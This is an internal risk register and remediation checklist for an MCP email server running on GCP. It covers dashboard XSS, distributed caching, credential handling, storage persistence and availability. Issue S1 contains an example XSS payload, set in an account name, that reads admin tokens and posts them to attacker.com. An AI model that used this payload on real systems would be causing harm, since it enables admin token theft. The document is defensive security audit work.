# Clawmail Risk Register & Mitigation Checklist

**Last Updated:** 2026-04-16  
**Project:** Clawmail MCP Email Server  
**Status:** Production-like (GCP deployed, multi-domain support)

---

## 📋 ISSUE CATALOG

| ID | Issue | Severity | Type | Component | Impact | Status |
|:--:|--------|----------|------|-----------|--------|--------|
| S1 | Dashboard DOM-based XSS | 🔴 HIGH | Security | dashboard.ts | Code injection, token theft | ⚪ To Do |
| S2 | Idempotency cache not distributed | 🟠 HIGH | Data | idempotency.ts | Duplicate emails at scale | ⚪ To Do |
| S3 | Admin password in HTTP Basic Auth | 🟠 MED | Security | jmap.ts | Credential exposure | ⚪ To Do |
| S4 | Token cache TTL allows revoked tokens | 🟡 MED | Security | tokens.ts | Revoked tokens valid for 60s | ⚪ To Do |
| S5 | Loose email domain validation | 🟡 MED | Validation | send.ts | Invalid emails accepted | ⚪ To Do |
| O1 | No Stalwart persistent storage | 🔴 HIGH | Data Loss | compute.tf | Complete data loss on restart | ⚪ To Do |
| O2 | Cloud Run scale-to-zero breaks state | 🟠 MED | Operations | cloudrun.tf | Lost idempotency, rate limits | ⚪ To Do |
| O3 | SendGrid API key rotation not automated | 🟠 MED | Operations | send.ts | Compromised key stays valid | ⚪ To Do |
| O4 | Stalwart VM single point of failure | 🔴 HIGH | Availability | compute.tf | Total outage if VM down | ⚪ To Do |
| O5 | Attachment size limit not enforced | 🟡 MED | Operations | send.ts | OOM risk, silent failures | ⚪ To Do |
| O6 | Dashboard session TTL too long (7 days) | 🟡 MED | Security | dashboard.ts | Compromised session = full access | ⚪ To Do |
| O7 | No Stalwart startup health checks | 🟡 MED | Operations | compute.tf | Silent startup failures | ⚪ To Do |
| A1 | Domain migration fallback is fragile | 🟡 MED | Architecture | jmap.ts | Wrong mailbox accessed | ⚪ To Do |
| A2 | Token storage in JMAP is unconventional | 🟡 MED | Design | tokens.ts | Performance, visibility in backups | ⚪ To Do |
| A3 | No audit logs by caller identity | 🟡 MED | Auditability | index.ts | No incident tracing | ⚪ To Do |
| A4 | Multi-domain support hardcoded | 🟡 LOW | Architecture | dns.tf | Manual ops for new domains | ⚪ To Do |
| D1 | Stalwart stability unknown (v0.15) | 🟡 MED | Dependency | compute.tf | Service unreliability | ⚪ Monitor |
| D2 | SendGrid relay single point of failure | 🟡 MED | Dependency | send.ts | No outbound delivery fallback | ⚪ To Do |

**Summary:**
- **🔴 HIGH:** 3 issues (data/security/availability)
- **🟠 MEDIUM:** 8 issues (operational/architectural)
- **🟡 LOW/MONITOR:** 7 issues (backlog/dependencies)

**Recommended Fix Timeline:** 4-5 weeks
- **Week 1:** Security (XSS, HTTP auth)
- **Week 2:** Distributed systems (Redis for idempotency)
- **Week 3:** Data persistence (Stalwart storage)
- **Week 4:** Availability (Stalwart HA)
- **Week 5:** Medium-priority operational fixes

---

# 📖 DETAILED ISSUES

---

## S1: Dashboard DOM-based XSS Vulnerability

**Severity:** 🔴 HIGH  
**Type:** Security / Web  
**Component:** `mcp-server/src/dashboard.ts` (lines 946-1017)  
**Status:** ⚪ To Do

### Description
Dashboard uses `innerHTML` to render dynamic content without proper HTML escaping in multiple places, allowing code injection via unescaped user data.

### Affected Code
```javascript
// Line 950: Error log entries
errBody.innerHTML = '<table>...' + errEntries.map(...).join('');  // errMsg not escaped

// Line 965: Tool call logs
// Unescaped account and error messages

// Line 2001: Storage panel
panel.innerHTML = html;  // User data not escaped
```

### Attack Scenario
1. Malicious agent creates account with name:
   ```
   "><script>fetch('/dashboard/tokens/reveal?i=0').then(r=>r.text()).then(t=>fetch('attacker.com',{method:'POST',body:t}))</script><div class="
   ```
2. Dashboard admin views accounts list
3. JavaScript executes with dashboard cookie access
4. Admin tokens exfiltrated to attacker.com

### Impact
- 🔴 Code injection in admin browser
- 🔴 Admin tokens stolen
- 🔴 Full infrastructure compromise

### Remediation Checklist
- [ ] Audit all `innerHTML` assignments in dashboard.ts
- [ ] Replace with `.textContent` where possible
- [ ] Apply `escHtml()` consistently to all user-controlled data
- [ ] Consider using templating library (lit-html, DOMPurify)
- [ ] Add Content Security Policy (CSP) headers
- [ ] Add automated XSS scanning to CI/CD
- [ ] Test with OWASP XSS test vectors

**Effort:** 🟢 1-2 hours  
**Priority:** 🔴 IMMEDIATE

---

## S2: Idempotency & Rate Limit Cache Not Distributed

**Severity:** 🟠 HIGH  
**Type:** Data Integrity / Distributed Systems  
**Components:** `idempotency.ts`, `index.ts` (rate limiting)  
**Status:** ⚪ To Do

### Description
Both idempotency cache and rate limiter are in-memory Maps with no distributed backing. When Cloud Run scales to multiple instances, each instance has independent caches, breaking both idempotency guarantees and rate limiting.

### Current Code
```javascript
// idempotency.ts
const cache = new Map<string, CachedResponse>();

// index.ts - rate limiting
const rateLimitWindows = new Map<string, number[]>();

// config.ts - Redis is optional, defaults to empty
redis: { url: process.env.REDIS_URL ?? "" }  // No Redis in dev/prod
```

### Failure Modes

**Idempotency Failure:**
```
1. Agent sends email with idempotency_key="foo" → routed to Instance A
2. Succeeds, cached in Instance A
3. Network flakes, agent retries
4. Retry routed to Instance B (different instance)
5. Cache miss → email sent AGAIN (duplicate)
```

**Rate Limiting Failure:**
```
With 10 Cloud Run instances:
- Configured limit: 20 sends/minute per account
- Actual limit: 20 × 10 = 200 sends/minute
- Attacker can bypass rate limits by distributing requests
```

### Impact
- 🔴 Duplicate emails sent to recipients
- 🔴 Rate limits ineffective at scale
- 🔴 Idempotency guarantees broken

### Remediation Checklist
- [ ] Set up Google Memorystore Redis instance (us-west1)
- [ ] Configure Cloud Run with `REDIS_URL=redis://10.x.x.x:6379`
- [ ] Update idempotency.ts to use Redis backend
- [ ] Update rate limiter to use Redis backend
- [ ] Set min-instances=1 temporarily while implementing Redis
- [ ] Add integration tests for concurrent requests
- [ ] Load test with 10+ Cloud Run instances

**Effort:** 🟡 4-6 hours (including Redis setup)  
**Priority:** 🔴 IMMEDIATE (breaks correctness)

---

## S3: STALWART_ADMIN_PASSWORD in HTTP Basic Auth

**Severity:** 🟠 MEDIUM  
**Type:** Security / Network  
**Component:** `jmap.ts` (lines 57-59)  
**Status:** ⚪ To Do

### Description
Master-user impersonation sends plaintext basic auth header with admin password on every JMAP call. If Cloud Run ↔ Stalwart traffic is unencrypted, password is exposed.

### Vulnerable Code
```javascript
function impersonateAuthHeader(targetEmail: string): string {
  const credentials = `${targetEmail}*admin:${config.stalwart.adminPassword}`;
  return `Basic ${Buffer.from(credentials).toString("base64")}`;
}
// Sent with every JMAP request
```

### Current Setup Analysis
- ✅ Firewall allows port 8080 only from VPC (`10.0.0.0/8`)
- ❌ No TLS configured between Cloud Run and Stalwart
- ❌ Traffic is `http://` (unencrypted)
- ❌ Anyone with GCP compromise can capture credentials

### Attack Scenario
```
1. Attacker compromises GCP service account
2. Creates new VM in clawmail VPC
3. Runs tcpdump on port 8080
4. Captures JMAP traffic with Base64-encoded admin credentials
5. Base64 decodes: targetEmail*admin:PASSWORD
6. Uses credentials to manage all mailboxes
```

### Impact
- 🔴 Credential exposure on network
- 🔴 Full mailbox access compromise
- 🟡 Requires GCP compromise first (medium likelihood)

### Remediation Checklist
- [ ] Enable TLS between Cloud Run and Stalwart
  - [ ] Generate self-signed cert on Stalwart VM
  - [ ] Configure Stalwart JMAP on port 8443 with TLS
  - [ ] Update `STALWART_URL=https://stalwart:8443`
  - [ ] Add root CA cert to Cloud Run
- [ ] Implement mTLS with client certificates
- [ ] Alternatively: Replace basic auth with OAuth-style tokens
- [ ] Verify firewall rules still restrict access

**Effort:** 🟡 4-6 hours  
**Priority:** 🟠 IMPORTANT (after security issues)

---

## S4: Token Cache TTL Allows Revoked Tokens

**Severity:** 🟡 MEDIUM  
**Type:** Security / Session  
**Component:** `tokens.ts` (lines 177-234)  
**Status:** ⚪ To Do

### Description
Token resolution caches by SHA-256 hash with 60-second TTL. Revoked tokens remain valid for up to 60 seconds due to cache.

### Current Code
```javascript
const cached = cache.get(hash);
if (cached !== undefined && Date.now() - cached.loadedAt < CACHE_TTL_MS) {
  return cached.entry;  // Uses cached token
}
// Reload from JMAP (but delay up to 60s)
```

### Failure Scenario
```
1. Admin revokes user token (token_abc)
2. Token deleted from JMAP database
3. User tries send_email with revoked token
4. System checks cache: still valid (< 60s old)
5. Operation succeeds even though token is revoked
6. After 60s, token finally becomes invalid
```

### Impact
- 🟡 Revoked tokens work for up to 60 seconds
- 🟡 Timing-dependent behavior (tests may miss)
- 🟡 Race condition with concurrent requests

### Remediation Checklist
- [ ] Reduce `CACHE_TTL_MS` from 60s to 5s
- [ ] Implement cache invalidation:
  - [ ] When token revoked, immediately purge from cache
  - [ ] Use Redis Pub/Sub for cross-instance invalidation
- [ ] Add integration test verifying token revocation is immediate
- [ ] Log cache hits vs misses for monitoring

**Effort:** 🟢 1-2 hours  
**Priority:** 🟡 IMPORTANT (medium risk, easy fix)

---

## S5: Loose Email Domain Validation

**Severity:** 🟡 MEDIUM  
**Type:** Validation / Input  
**Component:** `send.ts` (lines 28-32, 84-88)  
**Status:** ⚪ To Do

### Description
Email validation regex is overly permissive, allowing invalid formats. Domain extraction uses simple string split without DNS validation.

### Current Regex
```javascript
const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
```

Allows invalid emails:
- `user@.com` (empty domain prefix)
- `@example.com` (empty local part)
- `user@domain.c` (single-char TLD)
- IDNs accepted but may fail downstream

### Failure Mode
```
1. Config typo: allowed_domains = "fridaymailer.comm" (two m's)
2. Agent sends from user@fridaymailer.comm
3. Validation passes (domain is in list)
4. SendGrid rejects (domain not resolvable)
5. Silent failure (no error to caller)
```

### Impact
- 🟡 Misconfigured domains silently fail
- 🟡 Invalid formats accepted
- 🟡 International domains may cause issues

### Remediation Checklist
- [ ] Use proper email validator library (email-validator)
- [ ] Validate domain is DNS resolvable
- [ ] Reject or properly handle IDNs (punycode)
- [ ] Return errors instead of silent failures
- [ ] Add unit tests for edge cases:
  - [ ] Empty local/domain parts
  - [ ] Single-char TLDs
  - [ ] International domains
- [ ] Validate `allowed_domains` config at startup

**Effort:** 🟢 2-3 hours  
**Priority:** 🟡 MEDIUM (defensive, low current impact)

---

## O1: No Stalwart Persistent Storage

**Severity:** 🔴 HIGH  
**Type:** Data Loss / Infrastructure  
**Component:** `compute.tf` (no persistent disk), docker-compose.yml  
**Status:** ⚪ To Do

### Description
Stalwart mail server data lives on VM's ephemeral boot disk. All emails, mailboxes, folders lost if VM deleted or crashes.

### Current Setup
```yaml
# docker-compose.yml
volumes:
  stalwart_data:  # Ephemeral Docker volume
    # Lost on VM restart
```

### Failure Scenario
```
1. Stalwart VM crashes / is terminated
2. GCP detects failure, restarts VM
3. Docker container starts with EMPTY /opt/stalwart/data
4. Database restore restores metadata (Cloud SQL)
5. But all emails, mailbox state, folders are GONE
6. Mailboxes show as empty even though DB says they have messages
```

### Data Loss
- ❌ All emails in mailboxes (JMAP message store)
- ❌ Mailbox folders and labels
- ❌ Draft emails
- ❌ Calendar events (if using feature)
- ❌ Contacts (if using feature)
- ✅ Account credentials (in Cloud SQL)
- ✅ Domain config (in Cloud SQL)

### Impact
- 🔴 Catastrophic data loss for all users
- 🔴 No recovery mechanism
- 🔴 Unacceptable for production

### Remediation Checklist (Choose One Option)

**Option A: GCS FUSE (Recommended)**
- [ ] Create GCS bucket (regional, multi-region)
- [ ] Mount with Cloud Storage FUSE at `/opt/stalwart/data`
- [ ] Set up GCS versioning + lifecycle policies
- [ ] Test disaster recovery: restore from GCS + Cloud SQL
- [ ] Monitor FUSE health

**Option B: Persistent Disk**
- [ ] Create Persistent Disk (us-west1, regional auto-replicated)
- [ ] Attach to Stalwart VM
- [ ] Mount at `/opt/stalwart/data`
- [ ] Set up daily snapshots
- [ ] Document snapshot recovery procedure

**Option C: Managed Mail Service**
- [ ] Evaluate Google Cloud Managed Exchange
- [ ] Or migrate to third-party provider
- [ ] Trade ops burden for reliability

**Effort:** 🟡 4-8 hours (Option A or B)  
**Priority:** 🔴 IMMEDIATE (catastrophic impact)

---

## O2: Cloud Run Scale-to-Zero Breaks Session State

**Severity:** 🟠 MEDIUM  
**Type:** Operations / Distributed  
**Component:** `cloudrun.tf` (min_instance_count=0)  
**Status:** ⚪ To Do

### Description
Cloud Run configured to scale down to zero when idle, losing all in-memory state (idempotency, rate limits, sessions, flash messages).

### Current Config
```terraform
scaling {
  min_instance_count = 0  # Scales to zero
  max_instance_count = 10
}
```

### State Lost at Scale-to-Zero
- Session cookies (dashboard login)
- Idempotency cache (covered in S2)
- Rate limiter state (covered in S2)
- Flash messages (token reveal UI)

### User Impact
```
1. User logs into dashboard
2. Cloud Run starts instance, loads session cookie
3. No requests for 15+ minutes
4. Cloud Run scales down to zero
5. User tries to access dashboard
6. New instance starts, session cookie invalid
7. User must re-login
```

### Impact
- 🟡 Poor user experience (unexpected re-login)
- 🟡 Idempotency/rate limits also affected (separate issues)

### Remediation Checklist
- [ ] **Short-term:** Set `min_instance_count = 1`
- [ ] **Long-term:** Move state to Redis
  - [ ] Store sessions in Redis
  - [ ] Store idempotency in Redis
  - [ ] Cloud Run becomes stateless
  - [ ] Instances can scale to zero safely

**Effort:** 🟢 2-3 hours (short-term), 🟡 4-6 hours (long-term)  
**Priority:** 🟠 MEDIUM (annoying, not data loss)

---

## O3: SendGrid API Key Rotation Not Automated

**Severity:** 🟠 MEDIUM  
**Type:** Operations / Credentials  
**Component:** `send.ts` (lines 50-63)  
**Status:** ⚪ To Do

### Description
SendGrid API key loaded once at startup and cached. Manual restart required to rotate key. Compromised key stays valid until instance restart.

### Current Code
```javascript
let _transporter: nodemailer.Transporter | undefined;

function getTransporter(): nodemailer.Transporter {
  if (_transporter === undefined) {
    _transporter = nodemailer.createTransport({
      pass: config.sendgrid.apiKey,  // Cached
    });
  }
  return _transporter;
}
```

### Manual Rotation Process
1. Generate new key in SendGrid console
2. Update Secret Manager
3. Deploy new Cloud Run revision (or restart instances)
4. Revoke old key in SendGrid

### Attack Scenario
```
1. Cloud Build logs exposed (contains API key)
2. Attacker uses key to send spam
3. SendGrid account rate-limited or suspended
4. All legitimate emails stop flowing
5. Recovery: rotate key, restart instances
```

### Impact
- 🟠 No runtime key rotation
- 🟠 Compromised key valid until restart
- 🟠 No abuse detection metrics

### Remediation Checklist
- [ ] Implement dynamic transporter creation:
  ```javascript
  function getTransporter(): nodemailer.Transporter {
    return nodemailer.createTransport({
      pass: config.sendgrid.apiKey,  // Read fresh each time
    });
  }
  ```
- [ ] Add config reload without restart (Redis listener)
- [ ] Add endpoint to rotate credentials
- [ ] Add metrics for failed vs successful sends
- [ ] Monitor SendGrid bounce/complaint rates
- [ ] Set up SendGrid webhook validation

**Effort:** 🟡 4-6 hours  
**Priority:** 🟠 IMPORTANT (operational, medium impact)

---

## O4: Stalwart VM Single Point of Failure

**Severity:** 🔴 HIGH  
**Type:** Availability / Infrastructure  
**Component:** `compute.tf` (single VM, no HA)  
**Status:** ⚪ To Do

### Description
Stalwart runs on single Compute Engine VM (`e2-medium`). No redundancy, failover, or load balancer. Single point of failure for entire system.

### Failure Modes

**Mode 1: VM Crashes**
```
1. Stalwart VM crashes (power failure, OOM, kernel panic)
2. GCP auto-restarts → 2-5 minute downtime
3. No mail delivery, no JMAP access
4. All agents timeout
5. System unavailable for users
```

**Mode 2: Process Crashes**
```
1. Stalwart binary crashes (bug, memory)
2. Docker restarts (unless-stopped)
3. But Cloud Run still routes requests
4. Requests timeout instead of failing fast
5. Admin doesn't notice immediately
```

**Mode 3: Disk Full**
```
1. Stalwart logs fill local disk
2. Database can't write
3. Silent failures (no error reporting)
4. Emails appear sent but are lost
```

### Impact
- 🔴 Total system unavailable when Stalwart down
- 🔴 RTO (Recovery Time): 5-10 minutes
- 🔴 RPO (Recovery Point): Hours (last backup)
- 🔴 No graceful degradation

### Remediation Checklist (Choose One Option)

**Option A: Regional Redundancy (Recommended)**
- [ ] Deploy second Stalwart VM in us-west1-b (different zone)
- [ ] Set up GCP Health Checks on port 8080 (/.well-known/jmap)
- [ ] Use Cloud Load Balancer to route between VMs
- [ ] Set up Cloud SQL multi-region replication
- [ ] Test failover: kill one VM, verify traffic routes to other

**Option B: Instance Group with Auto-Healing**
- [ ] Convert single VM to Instance Group
- [ ] Set up health check (JMAP endpoint)
- [ ] Enable auto-healing (restarts failed instances)
- [ ] Min-instances=2 for redundancy
- [ ] Use Persistent Disk for data (addresses O1)

**Option C: Managed Mail Service**
- [ ] Migrate to Google Cloud Managed Exchange
- [ ] Or third-party SaaS mail provider
- [ ] Trade ops burden for reliability

**Effort:** 🔴 16-24 hours (Option A or B)  
**Priority:** 🔴 URGENT (critical service)

---

## O5: Attachment Size Limit Not Enforced

**Severity:** 🟡 MEDIUM  
**Type:** Operations / Resource  
**Component:** `send.ts` (limit defined but not used)  
**Status:** ⚪ To Do

### Description
Config defines `maxAttachmentBytes` (25MB) but this limit is never checked. Agents can send unlimited sizes.

### Current Code
```javascript
// config.ts - defined
limits: {
  maxAttachmentBytes: parseInt(process.env.MAX_ATTACHMENT_BYTES ?? "26214400", 10),
}

// send.ts - NOT CHECKED
// No validation against maxAttachmentBytes
```

### Failure Scenario
```
1. Agent sends 500MB email to 100 recipients
2. send_email validates format (not size)
3. Nodemailer accepts message
4. SendGrid rejects with 413 "Message too large"
5. Error caught but not returned to caller (silent)
6. Agent thinks email was sent
7. Recipients never receive it
```

### Impact
- 🟡 Unbounded memory usage (large emails in memory)
- 🟡 SendGrid errors not reported
- 🟡 Wasted bandwidth

### Remediation Checklist
- [ ] Add size check in send_email:
  ```javascript
  const estimatedSize = JSON.stringify(args).length + (attachmentBytes || 0);
  if (estimatedSize > config.limits.maxAttachmentBytes) {
    throw new Error(`Email exceeds max size`);
  }
  ```
- [ ] Ensure limit < SendGrid max (30MB)
- [ ] Return error instead of silent failure
- [ ] Add metrics to track email sizes
- [ ] Implement streaming if large sizes needed

**Effort:** 🟢 1-2 hours  
**Priority:** 🟡 MEDIUM (easy fix, prevents failures)

---

## O6: Dashboard Session TTL Too Long (7 Days)

**Severity:** 🟡 MEDIUM  
**Type:** Security / Session  
**Component:** `dashboard.ts` (lines 22-23)  
**Status:** ⚪ To Do

### Description
Dashboard session cookie valid for 7 days. For admin dashboard, this is excessive. Compromised session = full infrastructure control.

### Current Code
```javascript
const SESSION_TTL_MS = 7 * 24 * 60 * 60 * 1000;  // 7 days
```

### Risk Analysis
- 🟡 If session cookie stolen (XSS, network sniff, laptop theft):
  - Can manage all accounts
  - Create admin tokens
  - Delete all accounts
  - Full access for 7 days
- 🟡 No second-factor auth to stop attacker

### Attack Scenario
```
1. Admin browser infected with malware
2. Session cookie exfiltrated (7-day validity)
3. Attacker logs in as admin
4. Creates admin token for themselves
5. Revokes original admin
6. Full infrastructure compromise
```

### Impact
- 🟡 High-value attack target
- 🟡 Long window of compromise
- 🟡 No immediate revocation

### Remediation Checklist
- [ ] Reduce `SESSION_TTL_MS` from 7 days to 1-2 hours
- [ ] Add session expiry warning before timeout
- [ ] Implement "Logout all sessions" button
- [ ] Require re-auth for sensitive operations:
  - [ ] create_admin_token
  - [ ] delete_account
  - [ ] revoke_token
- [ ] Add two-factor authentication (TOTP)
- [ ] Log all admin actions (timestamp, IP, action)
- [ ] Verify cookies are secure, httpOnly, SameSite

**Effort:** 🟢 2-3 hours  
**Priority:** 🟡 IMPORTANT (easy fix, high impact)

---

## O7: No Stalwart Startup Health Checks

**Severity:** 🟡 MEDIUM  
**Type:** Operations / Monitoring  
**Component:** `compute.tf` startup script  
**Status:** ⚪ To Do

### Description
Stalwart startup script doesn't verify service is healthy before reporting success. Silent startup failures go unnoticed.

### Current Script
```bash
#!/bin/bash
docker compose -f /opt/stalwart/docker-compose.yml up -d
# No verification that Stalwart is ready
```

### Failure Scenario
```
1. Cloud SQL maintenance → Stalwart can't connect to DB
2. Docker container starts but exits immediately
3. No error reported (script doesn't check status)
4. Cloud Run still routes requests to "running" VM
5. All requests timeout
6. Admin doesn't notice until customer complaints
```

### Impact
- 🟡 Silent failures (no alert)
- 🟡 Requests timeout (poor UX)
- 🟡 Manual intervention needed

### Remediation Checklist
- [ ] Add startup health check to script:
  ```bash
  for i in {1..30}; do
    if curl -s -f http://localhost:8080/.well-known/jmap > /dev/null; then
      echo "Stalwart startup OK"
      exit 0
    fi
    sleep 2
  done
  echo "Stalwart startup failed" && exit 1
  ```
- [ ] Set up GCP Compute Engine Health Check:
  - [ ] Check port 8080, path `/.well-known/jmap`
  - [ ] Failure threshold: 3 consecutive failures
- [ ] Add Cloud Monitoring alert on health check failure
- [ ] Implement `/health` endpoint on MCP server
- [ ] Add liveness probe for container

**Effort:** 🟢 1-2 hours  
**Priority:** 🟡 MEDIUM (improves observability)

---

## A1: Domain Migration Fallback is Fragile

**Severity:** 🟡 MEDIUM  
**Type:** Architecture / Data  
**Component:** `jmap.ts` (lines 290-294)  
**Status:** ⚪ To Do

### Description
Account ID resolution has two-step fallback to handle domain migration. Creates ambiguity when multiple accounts share local-part.

### Current Code
```javascript
const principal =
  list.find((p) => p["email"].toLowerCase() === this.email.toLowerCase()) ??
  list.find((p) => p["name"].toLowerCase() === localPart);  // Fragile fallback
```

### Ambiguity Scenario
```
Accounts exist:
- alice@fridaymailer.com (id=123, name="alice")
- alice@fridayx.me (id=456, name="alice")

JMAP response missing email field:
1. Email lookup fails
2. Name lookup finds id=123 (first match)
3. Uses WRONG account!
4. Email sent to/from wrong mailbox
```

### Impact
- 🟡 Silent correctness issues
- 🟡 Wrong mailbox accessed
- 🟡 Emails misdirected
- 🟡 No error logging

### Remediation Checklist
- [ ] Ensure JMAP principals response includes email field
- [ ] Change fallback to warn on ambiguity:
  ```javascript
  if (emailMatches.length > 1) {
    logger.warn(`Ambiguous lookup for "${localPart}": ${emailMatches.length} matches`);
  }
  ```
- [ ] Add integration test with multi-domain setup
- [ ] Verify wrong mailbox not used in tests

**Effort:** 🟡 2-3 hours  
**Priority:** 🟡 MEDIUM (low probability, high impact)

---

## A2: Token Storage in JMAP is Unconventional

**Severity:** 🟡 MEDIUM  
**Type:** Design / Data Model  
**Component:** `tokens.ts` (entire file)  
**Status:** ⚪ To Do

### Description
Tokens stored as emails in `clawmail-system` account's `_tokens` mailbox. JMAP not designed as key-value store.

### Issues

1. **Backup Complexity**
   - Database backups include token hashes
   - Restore brings back old tokens
   - Token revocation not persistent

2. **Visibility**
   - Tokens appear in JMAP sync operations
   - Not truly hidden (rely on mailbox name)
   - System account visible in list_accounts

3. **Performance**
   - Each lookup hits JMAP (network call)
   - Not optimized for KV patterns
   - 10k+ tokens become slow

4. **Security**
   - Token bodies stored unencrypted in DB
   - Database snapshots include plaintext info

### Remediation Checklist (Choose Option)

**Option A: Redis (Recommended)**
- [ ] Store tokens in Redis instead of JMAP
  - [ ] Fast lookups (in-memory)
  - [ ] Automatic expiration (TTL)
  - [ ] Atomic revocation
  - [ ] Not in database backups
- [ ] Keep JMAP backup for recovery

**Option B: Stalwart Native**
- [ ] Use Stalwart's native token/credential store
- [ ] Or use Stalwart's OAuth module

**Option C: Cloud Firestore**
- [ ] Serverless, auto-scales
- [ ] Native TTL support
- [ ] Encrypted at rest
- [ ] Audit logging built-in

**Effort:** 🟡 6-8 hours (Option A)  
**Priority:** 🟡 MEDIUM (works but inefficient)

---

## A3: No Audit Logs by Caller Identity

**Severity:** 🟡 MEDIUM  
**Type:** Auditability / Compliance  
**Component:** `index.ts` (metrics collection)  
**Status:** ⚪ To Do

### Description
Operations logged to metrics but no caller identity (API key, token, IP). Can't audit which agent did what.

### Current Code
```javascript
export function recordMetric(tool: string, count: number = 1): void {
  const key = `${tool}:${Date.now() % REPORTING_WINDOW_MS}`;
  // No caller info in metrics
}
```

### Impact
- 🟡 Can't determine which token had access on compromise
- 🟡 Can't correlate actions to identities
- 🟡 Compliance violations (audit trail)
- 🟡 Incident response blind

### Real Scenario
```
1. User reports unauthorized emails
2. Ops sees "100 send_email calls"
3. No info on which token
4. Must assume full account compromise
```

### Remediation Checklist
- [ ] Add caller identity to all metrics:
  ```javascript
  recordMetric("send_email", 1, {
    caller_type: "token",
    caller_id: hash(token),
    target_domain: domain,
    source_ip: req.headers["x-forwarded-for"],
  });
  ```
- [ ] Log auth events:
  - [ ] token creation/revocation
  - [ ] API key usage
  - [ ] admin operations
- [ ] Use Cloud Logging for centralized trail
- [ ] Add dashboard showing "actions by token/key"

**Effort:** 🟡 4-6 hours  
**Priority:** 🟡 MEDIUM (operational, compliance)

---

## A4: Multi-Domain Support Hardcoded

**Severity:** 🟡 LOW  
**Type:** Architecture / Scalability  
**Component:** `dns.tf` (lines 99-173)  
**Status:** ⚪ To Do

### Description
Secondary domain support hardcoded for `fridayx.me`. Adding third domain requires manual Terraform code changes.

### Current Code
```terraform
resource "google_dns_managed_zone" "secondary" {
  name     = "fridayx-me"      # HARDCODED
  dns_name = "fridayx.me."     # HARDCODED
```

### Limitation
- Only supports 1 additional domain
- New domains require Terraform expertise
- Difficult to automate via API

### Remediation Checklist
- [ ] Implement Terraform `for_each`:
  ```terraform
  variable "additional_domains" {
    type = list(string)
    default = []
  }
  
  resource "google_dns_managed_zone" "additional" {
    for_each = toset(var.additional_domains)
    name     = replace(each.value, ".", "-")
    dns_name = "${each.value}."
  }
  ```
- [ ] Add REST API endpoint for dynamic domain addition
- [ ] Document domain addition process
- [ ] Add validation for duplicates

**Effort:** 🟢 2-3 hours  
**Priority:** 🟡 LOW (works fine for current needs)

---

## D1: Stalwart Mail Server Stability (Dependency)

**Severity:** 🟡 MEDIUM  
**Type:** Third-Party Dependency  
**Status:** ⚪ Monitor

### Description
Clawmail depends on Stalwart v0.15 (relatively new mail server). Multiple known limitations documented.

### Evidence of Instability
From CLAUDE.md & TODOS.md:
- Recent version upgrades required
- Bug fixes referenced (DKIM, inbound)
- Known limitations:
  - Spam filter not perfectly accurate
  - Inbound SMTP fails from residential IPs
  - User JMAP auth returns 401 (workaround: master-user)

### Risks
- 🟡 Critical bugs may appear
- 🟡 Project could be abandoned
- 🟡 Major upgrades may break API

### Mitigation Checklist
- [ ] Monitor Stalwart GitHub for security advisories
- [ ] Subscribe to release notifications
- [ ] Test each upgrade in staging first
- [ ] Maintain fork of Stalwart config
- [ ] Add integration tests for critical JMAP ops
- [ ] Keep contingency (Postfix + Dovecot) documented

**Effort:** 🟢 Ongoing monitoring  
**Priority:** 🟡 MONITOR (not actionable now)

---

## D2: SendGrid Relay Single Point of Failure

**Severity:** 🟡 MEDIUM  
**Type:** Third-Party Service / Uptime  
**Component:** `send.ts` (all outbound)  
**Status:** ⚪ To Do

### Description
All outbound email relayed through SendGrid. No fallback if SendGrid down. Errors silently logged, not reported.

### Current Code
```javascript
try {
  await getTransporter().sendMail({ ... });
} catch (error) {
  logger.error("sendMail error", error);
  // Still returns success to caller (no re-throw)
}
```

### Failure Scenario
```
1. SendGrid outage
2. sendMail() fails
3. Error silently logged
4. Caller gets success response
5. Agent thinks email queued
6. Recipient never receives it
```

### Impact
- 🟡 Single point of failure
- 🟡 Errors not reported
- 🟡 No graceful degradation

### Remediation Checklist
- [ ] Return error to caller (instead of silent catch)
- [ ] Implement message queue:
  - [ ] Cloud Tasks or Redis queue
  - [ ] Retry with exponential backoff
  - [ ] Allow agents to check status
- [ ] Add fallback relay (Mailgun, AWS SES)
  - [ ] Try SendGrid first
  - [ ] On failure, try fallback
  - [ ] Log which relay used
- [ ] Implement delivery receipts (SendGrid webhooks)
- [ ] Monitor SendGrid status page

**Effort:** 🟡 6-8 hours  
**Priority:** 🟠 IMPORTANT (operational resilience)

---

# 📊 PRIORITY & EFFORT MATRIX

| Priority | Category | Issues | Effort |
|----------|----------|--------|--------|
| 🔴 IMMEDIATE | Security | S1, S2, O1, O4 | 20-30h |
| 🟠 IMPORTANT | Operations | S3, O3, O6, D2 | 12-18h |
| 🟡 MEDIUM | Architectural | S4, S5, O2, O5, O7, A1, A2, A3 | 20-25h |
| 🔵 BACKLOG | Scalability | A4 | 2-3h |
| ⚪ MONITOR | Dependencies | D1 | Ongoing |

**Total Effort:** ~55-80 hours (7-10 weeks, 1 engineer)

---

# 🗓️ RECOMMENDED SCHEDULE

**Week 1: Security & Data Protection**
- [ ] S1: Fix dashboard XSS
- [ ] O1: Move Stalwart to persistent storage (Persistent Disk or GCS)
- Status: 🔴 Critical

**Week 2: Distributed Systems**
- [ ] S2: Set up Redis + distributed idempotency/rate limiting
- [ ] O2: Set min-instances=1 (temporary mitigation)
- Status: 🟠 Urgent

**Week 3: Infrastructure Hardening**
- [ ] S3: Enable TLS between Cloud Run and Stalwart
- [ ] O4: Implement Stalwart redundancy (multi-zone, load balancer)
- Status: 🔴 Critical

**Week 4: Operational Improvements**
- [ ] O3: SendGrid key rotation automation
- [ ] O6: Reduce dashboard session TTL, add 2FA
- [ ] O7: Add health checks
- Status: 🟠 Important

**Week 5: Medium-Priority Fixes**
- [ ] S4: Token cache TTL reduction
- [ ] S5: Email validation improvements
- [ ] O5: Enforce attachment size limits
- [ ] A1-A3: Fragile fallback & audit logs
- Status: 🟡 Medium

**Week 6+: Backlog**
- [ ] A4: Multi-domain scalability
- [ ] D1-D2: Dependency resilience
- Status: 🔵 Backlog

---

**Document Version:** 2.0  
**Last Updated:** 2026-04-16  
**Next Review:** 2026-05-16  
**Owner:** Engineering Lead
